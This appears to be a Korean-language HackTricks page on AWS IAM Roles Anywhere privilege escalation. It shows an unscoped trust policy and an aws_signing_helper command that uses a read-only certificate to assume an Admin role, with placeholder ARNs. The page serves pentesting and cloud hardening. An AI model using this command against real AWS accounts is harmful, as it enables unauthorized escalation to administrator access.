# AWS - IAM Roles Anywhere Privesc

{{#include ../../../../banners/hacktricks-training.md}}

AWS IAM RolesAnywhere는 AWS 외부의 워크로드가 X.509 인증서를 사용하여 IAM 역할을 맡을 수 있도록 합니다. 그러나 신뢰 정책이 적절하게 범위가 지정되지 않으면 권한 상승을 위해 악용될 수 있습니다.

이 정책은 허용되는 신뢰 앵커 또는 인증서 속성에 대한 제한이 없습니다. 결과적으로 계정의 모든 신뢰 앵커에 연결된 모든 인증서를 사용하여 이 역할을 맡을 수 있습니다.
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Principal": {
"Service": "rolesanywhere.amazonaws.com"
},
"Action": [
"sts:AssumeRole",
"sts:SetSourceIdentity",
"sts:TagSession"
]
}
]
}

```
프리베스크를 위해 `aws_signing_helper`가 필요합니다: https://docs.aws.amazon.com/rolesanywhere/latest/userguide/credential-helper.html

그런 다음 유효한 인증서를 사용하여 공격자는 더 높은 권한 역할로 전환할 수 있습니다.
```bash
aws_signing_helper credential-process \
--certificate readonly.pem \
--private-key readonly.key \
--trust-anchor-arn arn:aws:rolesanywhere:us-east-1:123456789012:trust-anchor/ta-id \
--profile-arn arn:aws:rolesanywhere:us-east-1:123456789012:profile/default \
--role-arn arn:aws:iam::123456789012:role/Admin
```
### References

- https://www.ruse.tech/blogs/aws-roles-anywhere-privilege-escalation/

{{#include ../../../../banners/hacktricks-training.md}}
